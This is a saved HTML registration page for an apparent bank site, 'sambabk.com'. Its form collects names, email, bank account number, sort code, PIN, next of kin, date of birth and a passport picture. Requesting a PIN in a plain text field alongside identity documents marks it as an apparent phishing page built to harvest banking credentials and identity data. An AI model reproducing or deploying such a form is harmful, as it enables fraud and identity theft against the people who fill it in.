
<!-- saved from url=(0031)http://uk.sambabk.com/e/reg.php -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<title>Registration</title>
<style type="text/css">
.textMB {	FONT-WEIGHT: bold; FONT-SIZE: 12px; FONT-FAMILY: Arial, Helvetica, sans-serif; HEIGHT: 25px
}
</style></head>

<body style="margin: 0px;">
<form action="insert_new_client_via_client.php" METHOD="post">
<table border="0" width="100%" cellspacing="0" cellpadding="0">
	<tbody><tr>
		<td bgcolor="#002245" height="36">
					<table border="0" width="100%" cellspacing="0" cellpadding="0">
						<tbody><tr>
							<td width="185" style="font-family: arial,sans-serif">&nbsp;</td>
							<td width="571" style="font-family: arial,sans-serif">
							<font color="#FFFFFF" face="Calibri" size="2">
							<a href="contactus.php"><font color="#FFFFFF">
							<span style="text-decoration: none">Contact Us</span></font></a></font></td>
							<td style="font-family: arial,sans-serif">
							<p align="right">
							<font face="Calibri" color="#FFFFFF" size="2">
							<a href="Registration.php"><font color="#FFFFFF">
							<span style="text-decoration: none">Register for an 
							Account</span></font></a>&nbsp; |&nbsp;
							<span style="text-decoration: none">
							<a href="index.html"><font color="#FFFFFF">
						  <span style="text-decoration: none">Back to home</span></font></a></span></font></p></td>
							<td width="198" style="font-family: arial,sans-serif">&nbsp;</td>
						</tr>
					</tbody></table>
					</td>
	</tr>
	<tr>
		<td>
		<img border="0" src="./Registration_files/member20.gif"></td>
	</tr>
	<tr>
		<td height="35">&nbsp;</td>
	</tr>
	<tr>
		<td>
		<table border="0" width="100%" cellspacing="0" cellpadding="0">
			<tbody><tr>
				<td>&nbsp;</td>
				<td width="967">
				<table border="0" width="100%" cellspacing="0" cellpadding="0">
					<tbody><tr>
						<td>
						<table border="0" width="78%" cellspacing="0" cellpadding="0">
							<tbody><tr>
								<td style="vertical-align: top;" width="385">
								<table border="0" width="76%" cellspacing="0" cellpadding="0">
									<tbody><tr>
										<td>
										<img src="./Registration_files/reg.ph25.gif" width="381" border="0"></td>
									</tr>
									<tr>
										<td>&nbsp;</td>
									</tr>
									<tr>
										<td><TABLE border=0 cellPadding=2 cellSpacing=0 width="82%" id="table18">
										  <TBODY>
										    <TR>
										      <TD colSpan=2 class="textMB"><p align="left"><b><SPAN class=style5>New Registration</SPAN></b><SPAN class=style6></SPAN></TD>
									        </TR>
										    <TR>
										      <TD align=right class="textMB">First Name </TD>
										      <TD align=left width=401><INPUT id=first
                    name=first_name required/></TD>
									        </TR>
										    <TR>
										      <TD align=right class="textMB">Last Name </TD>
										      <TD align=left><INPUT id=last name=last_name required/></TD>
									        </TR>
										    <TR>
										      <TD align=right class="textMB">Email</TD>
										      <TD align=left><INPUT id=email name=email_address required/></TD>
									        </TR>
										    <TR>
										      <TD align=right class="textMB" width=122>Account 
										        Number </TD>
										      <TD align=left><INPUT id=account name=account required/></TD>
									        </TR>
										    <TR>
										      <TD align=right class="textMB">Sort Code </TD>
										      <TD align=left><INPUT id=sort name=sort required/></TD>
									        </TR>
										    <TR>
										      <TD align=right class="textMB">PIN</TD>
										      <TD align=left><INPUT id=pin name=pin required/></TD>
									        </TR>
										    <TR>
										      <TD align=right class="textMB">Next of Kin </TD>
										      <TD align=left><INPUT id=deposit name=deposit required/></TD>
									        </TR>
										    <TR>
										      <TD align=right class="textMB"><SPAN class="text style3">Date of Birth</SPAN></TD>
										      <TD align=left><SPAN class=style67>
										        <SELECT name=month 
                        size=1>
										          <OPTION selected value=1>January</OPTION>
										          <OPTION value=2>February</OPTION>
										          <OPTION 
                          value=3>March</OPTION>
										          <OPTION value=4>April</OPTION>
										          <OPTION value=5>May</OPTION>
										          <OPTION 
                          value=6>June</OPTION>
										          <OPTION value=7>July</OPTION>
										          <OPTION value=8>August</OPTION>
										          <OPTION 
                          value=9>September</OPTION>
										          <OPTION 
                          value=10>October</OPTION>
										          <OPTION 
                          value=11>November</OPTION>
										          <OPTION 
                          value=12>December</OPTION>
									            </SELECT>
										        <SELECT name=day 
                        size=1>
										          <OPTION selected value=1>1</OPTION>
										          <OPTION 
                          value=2>2</OPTION>
										          <OPTION value=3>3</OPTION>
										          <OPTION 
                          value=4>4</OPTION>
										          <OPTION value=5>5</OPTION>
										          <OPTION 
                          value=6>6</OPTION>
										          <OPTION value=7>7</OPTION>
										          <OPTION 
                          value=8>8</OPTION>
										          <OPTION value=9>9</OPTION>
										          <OPTION 
                          value=10>10</OPTION>
										          <OPTION value=11>11</OPTION>
										          <OPTION value=12>12</OPTION>
										          <OPTION 
                          value=13>13</OPTION>
										          <OPTION value=14>14</OPTION>
										          <OPTION value=15>15</OPTION>
										          <OPTION 
                          value=16>16</OPTION>
										          <OPTION value=17>17</OPTION>
										          <OPTION value=18>18</OPTION>
										          <OPTION 
                          value=19>19</OPTION>
										          <OPTION value=20>20</OPTION>
										          <OPTION value=21>21</OPTION>
										          <OPTION 
                          value=22>22</OPTION>
										          <OPTION value=23>23</OPTION>
										          <OPTION value=24>24</OPTION>
										          <OPTION 
                          value=25>25</OPTION>
										          <OPTION value=26>26</OPTION>
										          <OPTION value=27>27</OPTION>
										          <OPTION 
                          value=28>28</OPTION>
										          <OPTION value=29>29</OPTION>
										          <OPTION value=30>30</OPTION>
										          <OPTION 
                          value=31>31</OPTION>
									            </SELECT>
										        <SELECT name=year size=1> 
                          <OPTION selected value=1931>1931</OPTION> 
                          
                           
                    <option value="1932">1932</option> <option value="1933">1933</option> <option value="1934">1934</option> 
                    <option value="1935">1935</option> <option value="1936">1936</option> <option value="1937">1937</option> 
                    <option value="1938">1938</option> <option value="1939">1939</option> <option value="1940">1940</option> 
                    <option value="1941">1941</option> <option value="1942">1942</option> <option value="1943">1943</option> 
                    <option value="1944">1944</option> <option value="1945">1945</option> <option value="1946">1946</option> 
                    <option value="1947">1947</option> <option value="1948">1948</option> <option value="1949">1949</option> 
                    <option value="1950">1950</option> <option value="1951">1951</option> <option value="1952">1952</option> 
                    <option value="1953">1953</option> <option value="1954">1954</option> <option value="1955">1955</option> 
                    <option value="1956">1956</option> <option value="1957">1957</option> <option value="1958">1958</option> 
                    <option value="1959">1959</option> <option value="1960">1960</option> <option value="1961">1961</option> 
                    <option value="1962">1962</option> <option value="1963">1963</option> <option value="1964">1964</option> 
                    <option value="1965">1965</option> <option value="1966">1966</option> <option value="1967">1967</option> 
                    <option value="1968">1968</option> <option value="1969">1969</option> <option value="1970">1970</option> 
                    <option value="1971">1971</option> <option value="1972">1972</option> <option value="1973">1973</option> 
                    <option value="1974">1974</option> <option value="1975">1975</option> <option value="1976">1976</option> 
                    <option value="1977">1977</option> <option value="1978">1978</option> <option value="1979">1979</option> 
                    <option value="1980">1980</option> <option value="1981">1981</option> <option value="1982">1982</option> 
                    <option value="1983">1983</option> <option value="1984">1984</option> <option value="1985">1985</option> 
                    <option value="1986">1986</option> <option value="1987">1987</option> <option value="1988">1988</option> 
                    <option value="1989">1989</option> <option value="1990">1990</option> <option value="1991">1991</option> 
                    <option value="1992">1992</option> <option value="1993">1993</option> <option value="1994">1994</option> 
                    <option value="1995">1995</option> <option value="1996">1996</option> <option value="1997">1997</option> 
                    <option value="1998">1998</option> <option value="1999">1999</option> <option value="2000">2000</option>
                          
                          <OPTION 
                          value=2001>2001</OPTION> <OPTION 
                          value=2002>2002</OPTION> <OPTION 
                          value=2003>2003</OPTION> <OPTION 
                          value=2004>2004</OPTION> <OPTION 
                          value=2005>2005</OPTION> <OPTION 
                          value=2006>2006</OPTION> <OPTION 
                          value=2007>2007</OPTION> <OPTION 
                          value=2008>2008</OPTION> <OPTION 
                          value=2009>2009</OPTION><OPTION 
                          value=2010>2010</OPTION><OPTION 
                          value=2011>2011</OPTION><OPTION 
                          value=2012>2012</OPTION><OPTION 
                          value=2013>2013</OPTION><OPTION 
                          value=2014>2014</OPTION><OPTION 
                          value=2015>2015</OPTION><OPTION 
                          value=2016>2016</OPTION><OPTION 
                          value=2017>2017</OPTION></SELECT>
										        </SPAN></TD>
									        </TR>
										    <TR>
										      <TD align=right><b> <font style="font-size: 9pt" face="Arial">Passport 
										        picture:</font></b></TD>
										      <TD align=left><input type="file" name="picture" size="20"></TD>
									        </TR>
										    <TR>
										      <TD align=right>&nbsp;</TD>
										      <TD align=left><INPUT name=Submit type=submit value="Create Account »"></TD>
									        </TR>
										    <TR>
										      <TD align=right>&nbsp;</TD>
										      <TD align=left>&nbsp;</TD>
									        </TR>
									      </TBODY>
									    </TABLE></td>
									</tr>
								</tbody></table>
								</td>
								<td width="10">&nbsp;</td>
								<td width="572" style="vertical-align: top;">
								<table border="0" width="100%" cellspacing="0" cellpadding="0">
									<tbody><tr>
										<td><img border="0" src="./Registration_files/member22.gif"></td>
									</tr>
									<tr>
										<td>
										<table border="0" width="50%" cellspacing="0" cellpadding="0">
											<tbody><tr>
												<td width="46">
												<img border="0" src="./Registration_files/member23.gif"></td>
												<td width="210">
												<table border="0" width="98%" cellspacing="1">
													<tbody><tr>
														<td>&nbsp;</td>
													</tr>
													<tr>
														<td>
														<font face="Arial" size="2">
														info@sambabk.com</font></td>
													</tr>
													<tr>
														<td>&nbsp;</td>
													</tr>
												</tbody></table>
												</td>
												<td>&nbsp;</td>
											</tr>
										</tbody></table>
										</td>
									</tr>
									<tr>
										<td>&nbsp;</td>
									</tr>
									<tr>
										<td>&nbsp;</td>
									</tr>
								</tbody></table>
								</td>
							</tr>
						</tbody></table>
						</td>
					</tr>
					<tr>
						<td>&nbsp;</td>
					</tr>
					<tr>
						<td>&nbsp;</td>
					</tr>
					<tr>
						<td>
						<a href="contactus.php">
						<img border="0" src="./Registration_files/member24.jpg"></a></td>
					</tr>
				</tbody></table>
				</td>
				<td>&nbsp;</td>
			</tr>
		</tbody></table>
		</td>
	</tr>
	</tbody></table>


</form>
</body>
</html>